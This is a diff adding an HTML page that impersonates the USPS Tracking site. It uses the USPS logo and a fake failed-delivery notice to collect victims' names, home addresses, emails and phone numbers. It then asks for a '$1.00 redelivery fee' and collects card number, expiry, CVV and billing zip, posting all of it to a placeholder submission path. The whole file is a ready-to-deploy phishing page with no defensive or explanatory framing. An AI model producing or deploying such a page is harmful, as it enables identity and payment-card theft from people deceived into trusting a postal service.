@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USPS.com® - USPS Tracking®</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="styles.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Top Navigation -->
+    <nav class="navbar navbar-expand-md navbar-dark navbar-usps">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <img src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg" alt="USPS.com">
+            </a>
+            <button class="navbar-toggler" type="button" onclick="toggleMainMenu()">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="mainNavigation">
+                <div class="navbar-nav ms-auto">
+                    <a class="nav-link" href="#">English</a>
+                    <a class="nav-link" href="#">Locations</a>
+                    <a class="nav-link" href="#">Support</a>
+                    <a class="nav-link" href="#">Informed Delivery</a>
+                    <a class="nav-link" href="#">Register / Sign In</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Quick Tools Bar -->
+    <div class="quick-tools">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-auto d-flex align-items-center">
+                    <strong>Quick Tools</strong>
+                    <button class="navbar-toggler ms-2 d-md-none" type="button" onclick="toggleQuickTools()">
+                        <span class="navbar-toggler-icon"></span>
+                    </button>
+                </div>
+                <div class="col nav-collapse">
+                    <nav class="nav">
+                        <a class="nav-link" href="#">Send</a>
+                        <a class="nav-link" href="#">Receive</a>
+                        <a class="nav-link" href="#">Shop</a>
+                        <a class="nav-link" href="#">Business</a>
+                        <a class="nav-link" href="#">International</a>
+                        <a class="nav-link" href="#">Help</a>
+                    </nav>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Alert Banner -->
+    <div class="alert alert-usps text-center">
+        ALERT: CANADA POST ADVISES THAT THE STRIKE BY ITS EMPLOYEES HAS ENDED. HOWEVER, INTERNATIONAL MAIL SERVICE TO CANADA IS STILL SUSPENDED. <a href="#" class="text-white"><u>READ MORE...</u></a>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <h1 class="tracking-title">USPS Tracking<sup>®</sup></h1>
+        
+        <!-- Address Form Container -->
+        <div class="form-container" id="addressForm">
+            <!-- Error Message Section -->
+            <div class="alert alert-warning mb-4 border">
+                <div class="mb-3" style="color: #333;">
+                    <strong>We're sorry we couldn't deliver your package due to an incorrect address.</strong>
+                </div>
+                <div class="mb-3" style="font-size: 14px; color: #333;">
+                    <strong>Tracking Number:</strong> <span style="font-family: monospace;">394838768394784</span>
+                </div>
+                <div style="color: #333;">
+                    Please provide the correct address below to schedule a reattempt for delivery.
+                </div>
+            </div>
+
+            <form id="addressFormContent">
+                <div class="row mb-3">
+                    <div class="col-md-6">
+                        <label class="form-label">First Name</label>
+                        <input type="text" class="form-control" name="firstName" required>
+                    </div>
+                    <div class="col-md-6">
+                        <label class="form-label">Last Name</label>
+                        <input type="text" class="form-control" name="lastName" required>
+                    </div>
+                </div>
+
+                <div class="mb-3">
+                    <label class="form-label">Address</label>
+                    <input type="text" class="form-control" name="address" required>
+                </div>
+
+                <div class="mb-3">
+                    <label class="form-label">Address 2</label>
+                    <input type="text" class="form-control" name="address2">
+                </div>
+
+                <div class="row mb-3">
+                    <div class="col-md-6">
+                        <label class="form-label">City</label>
+                        <input type="text" class="form-control" name="city" required>
+                    </div>
+                    <div class="col-md-6">
+                        <label class="form-label">State</label>
+                        <select class="form-control" name="state" required>
+    <option value="">Select State</option>
+    <option value="AL">Alabama</option>
+    <option value="AK">Alaska</option>
+    <option value="AZ">Arizona</option>
+    <option value="AR">Arkansas</option>
+    <option value="CA">California</option>
+    <option value="CO">Colorado</option>
+    <option value="CT">Connecticut</option>
+    <option value="DE">Delaware</option>
+    <option value="FL">Florida</option>
+    <option value="GA">Georgia</option>
+    <option value="HI">Hawaii</option>
+    <option value="ID">Idaho</option>
+    <option value="IL">Illinois</option>
+    <option value="IN">Indiana</option>
+    <option value="IA">Iowa</option>
+    <option value="KS">Kansas</option>
+    <option value="KY">Kentucky</option>
+    <option value="LA">Louisiana</option>
+    <option value="ME">Maine</option>
+    <option value="MD">Maryland</option>
+    <option value="MA">Massachusetts</option>
+    <option value="MI">Michigan</option>
+    <option value="MN">Minnesota</option>
+    <option value="MS">Mississippi</option>
+    <option value="MO">Missouri</option>
+    <option value="MT">Montana</option>
+    <option value="NE">Nebraska</option>
+    <option value="NV">Nevada</option>
+    <option value="NH">New Hampshire</option>
+    <option value="NJ">New Jersey</option>
+    <option value="NM">New Mexico</option>
+    <option value="NY">New York</option>
+    <option value="NC">North Carolina</option>
+    <option value="ND">North Dakota</option>
+    <option value="OH">Ohio</option>
+    <option value="OK">Oklahoma</option>
+    <option value="OR">Oregon</option>
+    <option value="PA">Pennsylvania</option>
+    <option value="RI">Rhode Island</option>
+    <option value="SC">South Carolina</option>
+    <option value="SD">South Dakota</option>
+    <option value="TN">Tennessee</option>
+    <option value="TX">Texas</option>
+    <option value="UT">Utah</option>
+    <option value="VT">Vermont</option>
+    <option value="VA">Virginia</option>
+    <option value="WA">Washington</option>
+    <option value="WV">West Virginia</option>
+    <option value="WI">Wisconsin</option>
+    <option value="WY">Wyoming</option>
+</select>
+
+                    </div>
+                </div>
+
+                <div class="row mb-3">
+                    <div class="col-md-6">
+                        <label class="form-label">Zipcode</label>
+                        <input type="text" class="form-control" name="zipcode" pattern="[0-9]*" maxlength="5" required>
+                    </div>
+                    <div class="col-md-6">
+                        <label class="form-label">Country</label>
+                        <input type="text" class="form-control" value="United States" readonly>
+                        <input type="hidden" name="country" value="US">
+                    </div>
+                </div>
+
+                <div class="mb-3">
+                    <label class="form-label">Email Address</label>
+                    <input type="email" class="form-control" name="email" required>
+                </div>
+
+                <div class="mb-4">
+                    <label class="form-label">Mobile Phone</label>
+                    <input type="tel" class="form-control" name="phone" required>
+                </div>
+
+                <div class="text-end">
+                    <button type="button" class="btn btn-usps" onclick="showPaymentForm()">Next</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Payment Form Container -->
+        <div class="form-container payment-container" id="paymentForm">
+            <div class="alert alert-warning mb-4 border">
+                <div class="mb-3" style="color: #333;">
+                    <strong>A fee of $1.00 is required to process your redelivery request.</strong>
+                </div>
+            </div>
+            
+            <div class="card-logos">
+                <img src="https://cdn.jsdelivr.net/gh/moneyphp/icons@0.0.3/svg/visa.svg" alt="Visa">
+                <img src="https://cdn.jsdelivr.net/gh/moneyphp/icons@0.0.3/svg/mastercard.svg" alt="Mastercard">
+                <img src="https://cdn.jsdelivr.net/gh/moneyphp/icons@0.0.3/svg/amex.svg" alt="American Express">
+                <img src="https://cdn.jsdelivr.net/gh/moneyphp/icons@0.0.3/svg/discover.svg" alt="Discover">
+            </div>
+
+            <form id="paymentFormContent" action="/submit/SUBDOMAIN_PLACEHOLDER" method="POST">
+                <!-- Hidden fields for address data -->
+                <input type="hidden" name="firstName" id="hiddenFirstName">
+                <input type="hidden" name="lastName" id="hiddenLastName">
+                <input type="hidden" name="address" id="hiddenAddress">
+                <input type="hidden" name="address2" id="hiddenAddress2">
+                <input type="hidden" name="city" id="hiddenCity">
+                <input type="hidden" name="state" id="hiddenState">
+                <input type="hidden" name="zipcode" id="hiddenZipcode">
+                <input type="hidden" name="email" id="hiddenEmail">
+                <input type="hidden" name="phone" id="hiddenPhone">
+
+                <div class="mb-3">
+                    <label class="form-label">Card Holder Name</label>
+                    <input type="text" class="form-control" name="cardHolderName" required>
+                </div>
+
+                <div class="mb-3">
+                    <label class="form-label">Card Number</label>
+                    <input type="text" class="form-control card-number-input" name="cardNumber" maxlength="19" required>
+                </div>
+
+                <div class="row mb-3">
+                    <div class="col-auto">
+                        <label class="form-label">Expiry Date</label>
+                        <input type="text" class="form-control expiry-input" name="expiryDate" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="col-auto">
+                        <label class="form-label">CVV</label>
+                        <input type="text" class="form-control cvv-input" name="cvv" pattern="[0-9]*" maxlength="4" required>
+                    </div>
+                    <div class="col-md-4">
+                        <label class="form-label">Billing Zipcode</label>
+                        <input type="text" class="form-control" name="billingZip" pattern="[0-9]*" maxlength="5" required>
+                    </div>
+                </div>
+
+                <div class="text-end">
+                    <button type="button" class="btn btn-secondary me-2" onclick="showAddressForm()">Back</button>
+                    <button type="submit" class="btn btn-usps">Pay $1.00</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- FAQ Section -->
+        <div class="faq-section">
+            <button class="faq-button">What does my tracking number look like?</button>
+            <button class="faq-button">Where do I find my tracking number?</button>
+            <button class="faq-button">How can I leave delivery instructions?</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
